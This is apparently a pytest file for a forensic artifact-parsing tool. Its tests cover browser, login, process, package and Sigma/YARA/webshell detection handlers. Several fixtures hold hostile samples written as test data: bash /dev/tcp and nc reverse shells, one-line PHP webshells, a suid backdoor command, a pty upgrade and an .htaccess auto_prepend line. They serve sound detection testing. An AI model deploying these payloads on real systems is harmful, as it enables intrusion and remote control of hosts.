    assert _wmi_used_time("20230921132530.000000-300") == "2023-09-21 18:25:30"  # UTC-5 -> UTC
    # no parseable offset -> digits kept as-is rather than guessed at
    assert _wmi_used_time("20230921132530") == "2023-09-21 13:25:30"
    assert _wmi_used_time("not-a-time") == "not-a-time"


def _concurrent_probe(ctx):
    """Test handler: writes its own output into ctx.out AND drops a 'foreign' file
    into the shared category dir (ctx.out.parent), as if another parser wrote there
    concurrently. Used to prove `short` only renames this parser's own files."""
    ctx.out.mkdir(parents=True, exist_ok=True)
    (ctx.out / "NetworkUsages.csv").write_text("a\n", encoding="utf-8")
    (ctx.out.parent / "wmi_ccm_rua.csv").write_text("foreign\n", encoding="utf-8")


def test_short_isolation_no_cross_rename(tmp_path):
    out = tmp_path / "CSVs"
    out.mkdir()
    p = ParserManifest(id="srumlike", handler=f"{__name__}:_concurrent_probe", short="srum")
    r = run_parser(p, _ctx(tmp_path, out))
    assert r.status == "ok"
    names = {f.name for f in out.glob("*.csv")}
    assert "srum_NetworkUsages.csv" in names       # own output gets the short prefix
    assert "wmi_ccm_rua.csv" in names              # foreign output left untouched
    assert "srum_wmi_ccm_rua.csv" not in names     # the concurrency bug must not recur
    assert not (out / ".work_srumlike").exists()   # private work dir cleaned up


def test_consolidate_keeps_oversized_int_table(tmp_path):
    import sqlite3

    (tmp_path / "CSVs").mkdir()
    # 1e19 is > int64 max but fits uint64 -> pandas reads the column as uint64
    # (not object), reproducing the real Amcache overflow that the str retry fixes.
    big = "10000000000000000000"
    (tmp_path / "CSVs" / "amc.csv").write_text(
        f"name,id\nfoo,{big}\nbar,{big}\n", encoding="utf-8"
    )
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])
    consolidate.build(m)

    db = tmp_path / "host.db"
    assert db.is_file()
    con = sqlite3.connect(db)
    try:
        n = con.execute("SELECT count(*) FROM amc").fetchone()[0]
        val = con.execute("SELECT id FROM amc LIMIT 1").fetchone()[0]
    finally:
        con.close()
    assert n == 2  # full table kept (oversized int coerced to text), not dropped/partial
    assert str(val) == big  # value preserved exactly as text


def test_handler_browser_chromium(tmp_path):
    import sqlite3

    from artifact_engine.handlers import win_browser

    prof = (tmp_path / "Users" / "alice" / "AppData" / "Local" / "Google"
            / "Chrome" / "User Data" / "Default")
    prof.mkdir(parents=True)
    con = sqlite3.connect(prof / "History")
    con.execute("CREATE TABLE urls (id INTEGER, url TEXT, title TEXT, "
                "visit_count INTEGER, last_visit_time INTEGER)")
    con.execute("INSERT INTO urls VALUES (1,'http://evil.test','Evil Site',3,13350000000000000)")
    con.execute("CREATE TABLE downloads (id INTEGER, target_path TEXT, tab_url TEXT, "
                "total_bytes INTEGER, start_time INTEGER, end_time INTEGER)")
    con.execute("INSERT INTO downloads VALUES "
                "(1,'C:\\Users\\alice\\Downloads\\evil.exe','http://evil.test/evil.exe',"
                "1024,13350000000000000,13350000000000000)")
    con.commit()
    con.close()

    out = tmp_path / "CSVs"
    win_browser.run(_ctx(tmp_path, out))

    hist = (out / "browser_history.csv").read_text(encoding="utf-8")
    # timestamp columns are labelled _utc in the header (values are pure UTC, no
    # local offset) so an analyst never mistakes them for local time
    assert hist.splitlines()[0] == \
        "user,browser,profile,url,title,visit_count,last_visit_utc"
    # 13350000000000000 us since the 1601 WebKit epoch = 2024-01-17 21:20:00 UTC
    assert "alice,Chrome,Default,http://evil.test,Evil Site,3,2024-01-17 21:20:00" in hist
    dl = (out / "browser_downloads.csv").read_text(encoding="utf-8")
    assert dl.splitlines()[0] == \
        "user,browser,profile,target_path,source_url,bytes,start_time_utc,end_time_utc"
    assert "evil.exe" in dl and "http://evil.test/evil.exe" in dl
    assert "2024-01-17 21:20:00,2024-01-17 21:20:00" in dl    # UTC, not UTC+2


# --------------------------------------------------------------------------- #
# Linux live-response handlers (UAC)
# --------------------------------------------------------------------------- #
def _lr(tmp_path: Path) -> Path:
    d = tmp_path / "live_response"
    (d / "network").mkdir(parents=True)
    (d / "system").mkdir(parents=True)
    (d / "process").mkdir(parents=True)
    return d


def test_handler_network_ss(tmp_path):
    from artifact_engine.handlers import lin_network
    (_lr(tmp_path) / "network" / "ss_-tanp.txt").write_text(
        "State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"
        'LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* users:(("mariadbd",pid=1557,fd=111))\n'
        'ESTAB  0 0 10.0.0.5:22 10.0.0.9:51324 users:(("sshd",pid=42,fd=3))\n',
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_network.run(_ctx(tmp_path, out))
    text = (out / "network_connections.csv").read_text(encoding="utf-8")
    assert "tcp,LISTEN,127.0.0.1,3306,0.0.0.0,*,mariadbd,1557" in text
    assert "tcp,ESTAB,10.0.0.5,22,10.0.0.9,51324,sshd,42" in text


def test_handler_logins_last_and_failed(tmp_path):
    from artifact_engine.handlers import lin_logins
    lr = _lr(tmp_path)
    (lr / "system" / "last.txt").write_text(
        "root     pts/0        10.0.0.9    Tue May 26 16:07   still logged in\n"
        "root     pts/1        10.0.0.9    Tue May 26 12:46 - 12:51  (00:05)\n"
        "\nwtmp begins Mon May  1 00:00:00 2026\n",
        encoding="utf-8",
    )
    (lr / "system" / "lastb.txt").write_text(
        "admin    ssh:notty    8.8.8.8     Wed May 20 09:42 - 09:42  (00:00)\n",
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_logins.run(_ctx(tmp_path, out))
    text = (out / "logins.csv").read_text(encoding="utf-8")
    assert "ok,root,pts/0,10.0.0.9,Tue May 26 16:07,still logged in" in text
    assert "ok,root,pts/1,10.0.0.9,Tue May 26 12:46,12:51  (00:05)" in text   # "- " stripped
    assert "failed,admin,ssh:notty,8.8.8.8,Wed May 20 09:42," in text
    assert "wtmp begins" not in text   # footer dropped


def test_handler_processes_and_hidden(tmp_path):
    from artifact_engine.handlers import lin_processes
    lr = _lr(tmp_path)
    (lr / "process" / "ps_-axo_pid_user_lstart_args.txt").write_text(
        "    PID USER     STARTED COMMAND\n"
        "      1 root     Fri May 22 15:20:16 2026 /sbin/init\n"
        "   1557 mysql    Fri May 22 15:21:00 2026 /usr/sbin/mariadbd --basedir=/usr\n",
        encoding="utf-8",
    )
    (lr / "process" / "hidden_pids_for_ps_command.txt").write_text("303719\n", encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_processes.run(_ctx(tmp_path, out))
    procs = (out / "processes.csv").read_text(encoding="utf-8")
    assert "1,root,Fri May 22 15:20:16 2026,/sbin/init" in procs
    assert "1557,mysql,Fri May 22 15:21:00 2026,/usr/sbin/mariadbd --basedir=/usr" in procs
    assert "PID,USER" not in procs   # header skipped
    assert "303719" in (out / "hidden_pids.csv").read_text(encoding="utf-8")


def test_handler_machineinfo_hostnamectl_and_nis(tmp_path):
    import json

    from artifact_engine.handlers import lin_machineinfo
    lr = _lr(tmp_path)
    (lr / "network" / "hostnamectl.txt").write_text(
        " Static hostname: web01\n"
        "Operating System: Ubuntu 24.04.4 LTS\n"
        "          Kernel: Linux 6.8.0-117-generic\n"
        "      Machine ID: abc123\n",
        encoding="utf-8",
    )
    (lr / "network" / "ip_addr_show.txt").write_text(
        "    inet 127.0.0.1/8 scope host lo\n"
        "    inet 203.0.113.204/24 scope global eth0\n"
        "    inet6 fe80::250:56ff:fea4:ef95/64 scope link\n",
        encoding="utf-8",
    )
    (tmp_path / "[root]" / "etc").mkdir(parents=True)
    (tmp_path / "[root]" / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "nobody:x:65534:65534:nobody:/:/usr/sbin/nologin\n"
        "+::::::\n",   # NIS entry must be ignored
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_machineinfo.run(_ctx(tmp_path, out))
    info = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
    assert info["machine_name"] == "web01"
    assert info["product_name"] == "Ubuntu 24.04.4 LTS"
    assert info["IPs"] == ["203.0.113.204"]          # loopback + link-local dropped
    assert info["users"] == ["root"]                  # nobody (nologin) + NIS dropped


def test_handler_anomalies(tmp_path):
    from artifact_engine.handlers import lin_anomalies
    lr = _lr(tmp_path)
    (lr / "system" / "hidden_files.txt").write_text("/tmp/.hidden\n", encoding="utf-8")
    (lr / "system" / "getcap_-r.txt").write_text("/bin/ping cap_net_raw=ep\n", encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_anomalies.run(_ctx(tmp_path, out))
    text = (out / "anomalies.csv").read_text(encoding="utf-8")
    assert "hidden_file,/tmp/.hidden," in text
    assert "file_capability,/bin/ping,cap_net_raw=ep" in text


def test_handler_auth_dispatch_by_proc(tmp_path):
    """sshd/cron 'session opened' lines must NOT be misread as su/sudo events."""
    from artifact_engine.handlers import lin_auth
    log = tmp_path / "[root]" / "var" / "log"
    log.mkdir(parents=True)
    (log / "auth.log").write_text(
        "2026-05-24T00:06:48.4+02:00 app01 sshd[74397]: Accepted password for root from 10.0.0.9 port 55099 ssh2\n"
        "2026-05-24T00:06:48.5+02:00 app01 sshd[74397]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)\n"
        "2026-05-24T00:07:00.0+02:00 app01 sshd[74398]: Failed password for invalid user oracle from 8.8.8.8 port 4444 ssh2\n"
        "2026-05-24T00:08:00.0+02:00 app01 sudo:   bruce : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/cat /etc/shadow\n"
        "2026-05-24T00:09:00.0+02:00 app01 su[999]: pam_unix(su:session): session opened for user root(uid=0) by bruce(uid=1000)\n",
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_auth.run(_ctx(tmp_path, out))
    rows = (out / "auth.csv").read_text(encoding="utf-8").splitlines()
    body = "\n".join(rows)
    assert sum(1 for r in rows if ",su," in r) == 1            # only the real su line
    assert "ssh_accepted,root,10.0.0.9,password port 55099" in body
    assert "ssh_failed,oracle,8.8.8.8,port 4444" in body
    assert "sudo,bruce,,/bin/cat /etc/shadow" in body
    assert "su,root,," in body                                  # (uid=0) stripped
    assert "root(uid=0)" not in body                            # decoration removed


def test_handler_packages_dpkg_and_verify(tmp_path):
    from artifact_engine.handlers import lin_packages
    pk = (_lr(tmp_path) / "packages")
    pk.mkdir(parents=True, exist_ok=True)
    (pk / "dpkg_-l.txt").write_text(
        "Desired=Unknown/Install/Remove/Purge/Hold\n"
        "||/ Name           Version      Architecture Description\n"
        "ii  nginx          1.24.0-1     amd64        web server\n"
        "rc  oldpkg         1.0          amd64        removed, config remains\n",
        encoding="utf-8",
    )
    (pk / "dpkg_-V.txt").write_text(
        "??5?????? c /etc/nginx/nginx.conf\n"
        "missing     /usr/bin/important\n",
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_packages.run(_ctx(tmp_path, out))
    pkgs = (out / "packages.csv").read_text(encoding="utf-8")
    assert "nginx,1.24.0-1,amd64,dpkg," in pkgs
    assert "oldpkg" not in pkgs                          # 'rc' (not installed) excluded
    ver = (out / "package_verify.csv").read_text(encoding="utf-8")
    assert "dpkg,??5??????,c,/etc/nginx/nginx.conf" in ver
    assert "dpkg,missing,,/usr/bin/important" in ver


def test_handler_packages_rpm(tmp_path):
    from artifact_engine.handlers import lin_packages
    pk = (_lr(tmp_path) / "packages")
    pk.mkdir(parents=True, exist_ok=True)
    (pk / "rpm_-q_-a_--queryformat_installtime_name_version_release.txt").write_text(
        "1702565235~libfstrm0~0.6.1-150300.9.3.1\n", encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_packages.run(_ctx(tmp_path, out))
    pkgs = (out / "packages.csv").read_text(encoding="utf-8")
    assert "libfstrm0,0.6.1-150300.9.3.1,,rpm,2023-12-14 14:47:15" in pkgs


def test_handler_hashes_join(tmp_path):
    from artifact_engine.handlers import lin_hashes
    he = tmp_path / "hash_executables"
    he.mkdir()
    (he / "hash_executables.md5").write_text("aaa  /bin/ls\nbbb  /tmp/x\n", encoding="utf-8")
    (he / "hash_executables.sha1").write_text("ccc  /bin/ls\n", encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_hashes.run(_ctx(tmp_path, out))
    text = (out / "executable_hashes.csv").read_text(encoding="utf-8")
    assert "/bin/ls,aaa,ccc" in text
    assert "/tmp/x,bbb," in text          # md5 only, sha1 blank


def test_handler_bodyfile_epoch_and_pipe(tmp_path):
    from artifact_engine.handlers import lin_bodyfile
    bf = tmp_path / "bodyfile"
    bf.mkdir()
    (bf / "bodyfile.txt").write_text(
        "0|/var|9568257|drwxr-xr-x|0|0|4096|1779800549|1772324917|1772324917|1694157736\n"
        "0|/tmp/a|b|c.txt|5|drwx|0|0|10|100|200|300|400\n",   # filename contains '|'
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_bodyfile.run(_ctx(tmp_path, out))
    rows = (out / "bodyfile.csv").read_text(encoding="utf-8").splitlines()
    assert rows[0] == "name,inode,mode,uid,gid,size,atime_utc,mtime_utc,ctime_utc,crtime_utc"
    assert "/var,9568257,drwxr-xr-x,0,0,4096,2026-05-26 13:02:29," in rows[1]
    assert any(r.startswith("/tmp/a|b|c.txt,") for r in rows[2:])   # '|' in name preserved


# --------------------------------------------------------------------------- #
# Linux review polish
# --------------------------------------------------------------------------- #
def test_handler_bash_multi_shell_and_histtimeformat(tmp_path):
    from artifact_engine.handlers import lin_bash
    home = tmp_path / "[root]" / "home" / "bob"
    home.mkdir(parents=True)
    (home / ".bash_history").write_text("#1700000000\nwhoami\n", encoding="utf-8")  # epoch marker
    (home / ".zsh_history").write_text(": 1700000000:0;curl http://evil\n", encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_bash.run(_ctx(tmp_path, out))
    text = (out / "bash.csv").read_text(encoding="utf-8")
    assert "bob,bash,,whoami" in text
    assert "bob,zsh,,curl http://evil" in text         # zsh extended-history prefix stripped
    assert "#1700000000" not in text                    # HISTTIMEFORMAT marker dropped


def test_handler_gtfobins_history_abuse(tmp_path):
    """GTFOBins scanner flags the exploitation fragment (find -exec sh, awk system,
    reverse shell, pty upgrade, vim escape, suid backdoor), marks sudo privesc, and
    leaves benign commands -- including a plain find -- untouched."""
    import csv as _csv

    from artifact_engine.handlers import lin_gtfobins
    home = tmp_path / "[root]" / "home" / "bob"
    home.mkdir(parents=True)
    (home / ".bash_history").write_text(
        "ls -la\n"
        "sudo apt-get update\n"
        "find /var/log -name '*.log'\n"                        # benign find -> no match
        "find / -name id -exec /bin/sh \\;\n"                  # shell escape
        "awk 'BEGIN{system(\"/bin/sh\")}'\n"                   # awk system()
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"             # reverse shell
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"   # pty shell upgrade
        "vim -c ':!/bin/sh'\n"                                 # vim shell escape
        "chmod u+s /bin/bash\n"                                # suid backdoor
        "sudo find / -name x -exec bash \\;\n",                # privesc via sudo
        encoding="utf-8")
    out = tmp_path / "CSVs" / "Detections"
    lin_gtfobins.run(_ctx(tmp_path, out))

    rows = list(_csv.DictReader((out / "gtfobins.csv").open(encoding="utf-8")))
    by_bin: dict[str, list] = {}
    for r in rows:
        by_bin.setdefault(r["binary"], []).append(r)
    assert {"find", "awk", "bash", "python", "vim", "chmod"} <= set(by_bin)
    # functions assigned correctly
    assert by_bin["bash"][0]["function"] == "reverse-shell"
    assert by_bin["awk"][0]["function"] == "shell"
    assert by_bin["chmod"][0]["function"] == "suid"
    # sudo turns a shell escape into a flagged privesc; the plain find is not
    assert [r for r in by_bin["find"] if r["sudo"] == "yes"]
    assert [r for r in by_bin["find"] if r["sudo"] != "yes"]
    # reverse shell is the most severe -> sorts first
    assert rows[0]["function"] == "reverse-shell"
    # benign commands (incl. a real find) never appear
    cmds = {r["command"] for r in rows}
    assert "ls -la" not in cmds
    assert "sudo apt-get update" not in cmds
    assert "find /var/log -name '*.log'" not in cmds


def test_handler_gtfobins_benign_history_writes_nothing(tmp_path):
    from artifact_engine.handlers import lin_gtfobins
    home = tmp_path / "[root]" / "home" / "bob"
    home.mkdir(parents=True)
    (home / ".bash_history").write_text(
        "ls -la\ncd /var/log\nsudo systemctl restart nginx\nvim /etc/hosts\n",
        encoding="utf-8")
    out = tmp_path / "CSVs" / "Detections"
    lin_gtfobins.run(_ctx(tmp_path, out))
    assert not (out / "gtfobins.csv").exists()   # 0-row policy: no clutter file


def test_handler_anomalies_suspicious_flag(tmp_path):
    from artifact_engine.handlers import lin_anomalies
    lr = _lr(tmp_path)
    (lr / "system" / "hidden_files.txt").write_text(
        "/tmp/.x\n/home/bob/.bashrc\n", encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_anomalies.run(_ctx(tmp_path, out))
    lines = (out / "anomalies.csv").read_text(encoding="utf-8").splitlines()
    assert lines[0].endswith("suspicious")
    assert "hidden_file,/tmp/.x,,yes" in lines
    assert "hidden_file,/home/bob/.bashrc,," in lines
    assert lines.index("hidden_file,/tmp/.x,,yes") < \
        lines.index("hidden_file,/home/bob/.bashrc,,")   # suspicious sorted first


def test_handler_auth_reads_gzip(tmp_path):
    import gzip

    from artifact_engine.handlers import lin_auth
    log = tmp_path / "[root]" / "var" / "log"
    log.mkdir(parents=True)
    with gzip.open(log / "auth.log.2.gz", "wt", encoding="utf-8") as fh:
        fh.write("2026-05-01T00:00:00+02:00 h sshd[1]: Failed password for root from 1.2.3.4 port 22 ssh2\n")
    out = tmp_path / "CSVs"
    lin_auth.run(_ctx(tmp_path, out))
    assert "ssh_failed,root,1.2.3.4,port 22" in (out / "auth.csv").read_text(encoding="utf-8")


def test_handler_machineinfo_enriched(tmp_path):
    import json

    from artifact_engine.handlers import lin_machineinfo
    lr = _lr(tmp_path)
    (lr / "network" / "hostnamectl.txt").write_text(" Static hostname: h\n", encoding="utf-8")
    (lr / "hardware").mkdir()
    (lr / "hardware" / "lscpu.txt").write_text(
        "CPU(s):       8\nModel name:   Intel Xeon Gold 5220R\n", encoding="utf-8")
    (lr / "system" / "free.txt").write_text(
        "         total used\nMem:  16375632 100\nSwap: 0 0\n", encoding="utf-8")
    (lr / "system" / "last.txt").write_text(
        "reboot   system boot  6.8.0  Fri May 22 14:50   still running\n", encoding="utf-8")
    (tmp_path / "[root]" / "etc").mkdir(parents=True)
    (tmp_path / "[root]" / "etc" / "timezone").write_text("Europe/Madrid\n", encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_machineinfo.run(_ctx(tmp_path, out))
    info = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
    assert info["timezone"] == "Europe/Madrid"
    assert info["cpu"] == "Intel Xeon Gold 5220R"
    assert info["cpu_count"] == "8"
    assert info["memory"] == "15.6 GiB"
    assert info["boot_time"] == "Fri May 22 14:50"


# --------------------------------------------------------------------------- #
# Sigma detections (pysigma over raw UAC logs)
# --------------------------------------------------------------------------- #
def test_sigma_engine_compiles_bundled_rules():
    from artifact_engine.core import sigma_engine
    sigma_engine.load_rules.cache_clear()
    rules = sigma_engine.load_rules()
    assert len(rules) > 50                                  # bundled SigmaHQ linux ruleset
    tables = {r.table for r in rules}
    assert {"auditd", "syslog"} <= tables
    assert all(r.sql.startswith("SELECT * FROM ") for r in rules)
    assert all("<TABLE_NAME>" not in r.sql for r in rules)   # placeholder substituted
    # the logsource `service` is spliced into the SQL and the ruleset is refreshed
    # from upstream, so it is whitelisted, not trusted: a quote would break the query
    # and the rule would be silently counted as "skipped"
    assert all(sigma_engine._SAFE_SERVICE.fullmatch(r.service) for r in rules if r.service)
    for bad in ("o'brien", "a b", "x;DROP", "%", "a" * 65, ""):
        assert not sigma_engine._SAFE_SERVICE.fullmatch(bad)
    # every service-scoped syslog rule really did get the `proc` constraint (the
    # anti-FP guard that stops cron's 'REPLACE' matching unrelated daemons)
    scoped = [r for r in rules if r.table == "syslog" and r.service]
    assert scoped and all("proc LIKE '%" in r.sql for r in scoped)


def test_sigma_auditd_flatten_synthesises_process_fields():
    from artifact_engine.handlers.lin_sigma import _parse_auditd
    rows = _parse_auditd([
        'type=SYSCALL msg=audit(1700000000.1:42): arch=c000003e syscall=59 uid=0 exe="/usr/bin/nc" comm="nc"',
        'type=EXECVE msg=audit(1700000000.1:42): argc=3 a0="nc" a1="-e" a2=2F62696E2F7368',  # /bin/sh in hex
        'type=CWD msg=audit(1700000000.1:42): cwd="/root"',
    ])
    syscall_row = next(r for r in rows if r["type"] == "SYSCALL")
    assert syscall_row["SYSCALL"] == "execve"                # number 59 -> name
    assert syscall_row["Image"] == "/usr/bin/nc"
    assert syscall_row["CommandLine"] == "nc -e /bin/sh"     # hex arg decoded
    assert syscall_row["CurrentDirectory"] == "/root"
    assert "syscall" not in syscall_row                       # lowercase dropped (case clash)


def test_sigma_handler_detects_and_respects_service(tmp_path, monkeypatch):
    from artifact_engine.core.sigma_engine import CompiledRule
    from artifact_engine.handlers import lin_sigma

    rules = (
        CompiledRule("Reverse shell via nc", "high", "id1", "attack.t1059", "auditd", "",
                     "SELECT * FROM auditd WHERE CommandLine LIKE '%nc -e%'"),
        CompiledRule("SSH failed password", "medium", "id2", "", "syslog", "sshd",
                     "SELECT * FROM syslog WHERE proc LIKE '%sshd%' AND (message LIKE '%Failed password%')"),
    )
    monkeypatch.setattr(lin_sigma, "load_rules", lambda: rules)

    log = tmp_path / "[root]" / "var" / "log"
    (log / "audit").mkdir(parents=True)
    (log / "audit" / "audit.log").write_text(
        'type=SYSCALL msg=audit(1700000000.1:42): syscall=59 uid=0 exe="/usr/bin/nc"\n'
        'type=EXECVE msg=audit(1700000000.1:42): argc=3 a0="nc" a1="-e" a2="/bin/sh"\n',
        encoding="utf-8")
    (log / "auth.log").write_text(
        "2026-05-24T00:00:00+02:00 h sshd[1]: Failed password for root from 8.8.8.8 port 22 ssh2\n"
        "2026-05-24T00:00:01+02:00 h cron[9]: Failed password lookalike in cron\n",  # not sshd -> must NOT match
        encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_sigma.run(_ctx(tmp_path, out))
    text = (out / "sigma_detections.csv").read_text(encoding="utf-8")
    assert "high,Reverse shell via nc," in text
    assert "medium,SSH failed password," in text
    assert text.count("SSH failed password") == 1            # cron lookalike excluded by service


def test_sigma_handler_no_logs_is_clean(tmp_path):
    from artifact_engine.handlers import lin_sigma
    (tmp_path / "[root]").mkdir()
    lin_sigma.run(_ctx(tmp_path, tmp_path / "CSVs"))          # no var/log -> must not raise
    # no detections -> no CSV (a header-only file is just clutter)
    assert not (tmp_path / "CSVs" / "sigma_detections.csv").exists()


def test_write_csv_suppresses_empty(tmp_path):
    from artifact_engine.handlers._lincommon import write_csv
    write_csv(tmp_path, "empty.csv", ["a", "b"], [])
    assert not (tmp_path / "empty.csv").exists()             # 0 rows -> no file
    write_csv(tmp_path, "full.csv", ["a", "b"], [["1", "2"]])
    assert (tmp_path / "full.csv").exists()                  # rows -> file written


def test_handler_yara_matches_and_prunes_collector(tmp_path):
    import shutil

    import pytest
    pytest.importorskip("yara")
    from artifact_engine.config import DATA_DIR

    # Isolated rules dir: only the committed bundled rules, never whatever
    # `aeng setup` may have downloaded into the real assets dir (determinism).
    rules_dir = tmp_path / "assets" / "yara"
    rules_dir.mkdir(parents=True)
    for yar in (DATA_DIR / "assets" / "yara").glob("*.yar"):
        shutil.copy(yar, rules_dir / yar.name)

    rootd = tmp_path / "[root]"
    tmpd = rootd / "tmp"
    tmpd.mkdir(parents=True)
    (tmpd / "evil.php").write_text("<?php @system($_GET['c']); ?>", encoding="utf-8")
    (tmpd / "drop.sh").write_text("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
    # collector + THOR subtrees carry malware-looking content -> must be pruned
    coll = rootd / "tmp" / "incibe" / "uac-3.1.0"
    coll.mkdir(parents=True)
    (coll / "x.php").write_text("<?php @eval($_POST['c']); ?>", encoding="utf-8")
    thor = rootd / "tmp" / "incibe" / "thor10-pack" / "signatures"
    thor.mkdir(parents=True)
    (thor / "rev.txt").write_text("nc -e /bin/sh 1.2.3.4 4444\n", encoding="utf-8")
    # benign file -> no match
    (tmpd / "ok.php").write_text("<?php echo json_encode($data); ?>", encoding="utf-8")

    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                        assets=tmp_path / "assets", machine_name="h", volume="live", log=None)
    p = ParserManifest(id="yara", handler="artifact_engine.handlers.lin_yara:run")
    r = run_parser(p, ctx)
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "yara.csv").read_text(encoding="utf-8")
    assert "webshell_php_input_to_exec,,tmp/evil.php" in out
    assert "revshell_dev_tcp,,tmp/drop.sh" in out
    assert "uac-3.1.0" not in out          # collector subtree pruned
    assert "thor10-pack" not in out        # THOR subtree pruned
    assert "ok.php" not in out             # benign spared


def test_handler_webshells_detects_and_spares_benign(tmp_path):
    www = tmp_path / "[root]" / "var" / "www" / "html"
    www.mkdir(parents=True)
    (www / "shell.php").write_text("<?php @eval($_POST['c']); ?>", encoding="utf-8")
    (www / "index.php").write_text(
        "<?php $x = base64_decode($config); echo system('uptime'); ?>", encoding="utf-8")
    (www / ".htaccess").write_text("php_value auto_prepend_file /tmp/.x/p.php\n", encoding="utf-8")

    p = ParserManifest(id="webshells",
                       handler="artifact_engine.handlers.lin_webshells:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "webshells.csv").read_text(encoding="utf-8")
    assert "var/www/html/shell.php" in out and "input_to_exec" in out
    assert "htaccess_handler" in out                 # auto_prepend_file flagged
    # index.php uses base64_decode/system but NOT on a request superglobal -> spared
    assert "var/www/html/index.php" not in out


def test_handler_webshells_skips_without_web_root(tmp_path):
    (tmp_path / "[root]" / "etc").mkdir(parents=True)
    p = ParserManifest(id="webshells",
                       handler="artifact_engine.handlers.lin_webshells:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "skipped"
    assert not (tmp_path / "CSVs" / "webshells.csv").exists()


def _utmp_record(ut_type, line, user, host, sec):
    import struct
    r = bytearray(384)
    struct.pack_into("<i", r, 0, ut_type)
    r[8:8 + len(line)] = line.encode()
    r[44:44 + len(user)] = user.encode()
    r[76:76 + len(host)] = host.encode()
    struct.pack_into("<i", r, 340, sec)
    return bytes(r)


def test_handler_btmp_parses_failed_logins(tmp_path):
    logdir = tmp_path / "[root]" / "var" / "log"
    logdir.mkdir(parents=True)
    (logdir / "btmp").write_bytes(
        _utmp_record(6, "ssh:notty", "root", "45.66.33.21", 1700000000)
        + _utmp_record(6, "ssh:notty", "admin", "45.66.33.21", 1700000060))

    p = ParserManifest(id="btmp", requires=["[root]/var/log/btmp"],
                       handler="artifact_engine.handlers.lin_btmp:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "btmp.csv").read_text(encoding="utf-8")
    assert "root,LOGIN_PROCESS,ssh:notty,45.66.33.21" in out
    assert "admin,LOGIN_PROCESS,ssh:notty,45.66.33.21" in out
    assert "2023-11-14" in out                       # timestamp decoded


def test_handler_anomalies_world_writable(tmp_path):
    from artifact_engine.handlers import lin_anomalies
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "world_writable_files.txt").write_text(
        "/tmp/sess.lock\n"                              # expected temp -> skipped
        "/var/www/html/shell.php\n"                     # writable script -> flagged
        "/var/www/html/uploads/photo.jpg\n"             # inert image -> skipped
        "/.snapshots/5/snapshot/etc/x.sh\n", encoding="utf-8")  # snapshot -> skipped
    (sysd / "world_writable_directories.txt").write_text(
        "/etc/cron.d\n"                                 # system dir -> flagged
        "/var/www/html/uploads/2016\n", encoding="utf-8")  # webroot churn -> skipped

    lin_anomalies.run(_ctx(tmp_path, tmp_path / "CSVs"))
    out = (tmp_path / "CSVs" / "anomalies.csv").read_text(encoding="utf-8")
    assert "world_writable_file,/var/www/html/shell.php,,yes" in out   # writable .php -> flagged
    assert "/tmp/sess.lock" not in out                 # expected temp skipped
    assert "photo.jpg" not in out                      # inert image skipped
    assert "x.sh" not in out                           # snapshot copy skipped
    assert "world_writable_dir,/etc/cron.d,,yes" in out                # system dir -> flagged
    assert "uploads/2016" not in out                   # non-system dir skipped


def test_handler_kernel_modules_and_taint(tmp_path):
    from artifact_engine.handlers import lin_kernel
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "lsmod.txt").write_text(
        "Module                  Size  Used by\n"
        "evil_lkm               12288  0\n"
        "xfs                  2000000  2 dm_mod\n", encoding="utf-8")
    # 12288 = bit13 (unsigned_module) + bit12 (out_of_tree_module)
    (sysd / "cat_proc_sys_kernel_tainted.txt").write_text("12288\n", encoding="utf-8")
    (sysd / "core_pattern.txt").write_text("|/tmp/.x/collect %p\n", encoding="utf-8")

    lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
    assert "taint,unsigned_module,bit 13,yes" in out          # rootkit-relevant -> flagged
    assert "taint,out_of_tree_module,bit 12," in out          # common -> listed, not flagged
    assert "taint,taint_value,12288,yes" in out
    assert "core_pattern,core_pattern,|/tmp/.x/collect %p,yes" in out  # non-standard handler
    assert "module,evil_lkm,size=12288 used_by_count=0," in out
    assert "module,xfs,size=2000000 used_by_count=2 used_by=dm_mod," in out


def test_handler_kernel_core_pattern_benign(tmp_path):
    from artifact_engine.handlers import lin_kernel
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "core_pattern.txt").write_text(
        "|/usr/lib/systemd/systemd-coredump %P %u %g\n", encoding="utf-8")
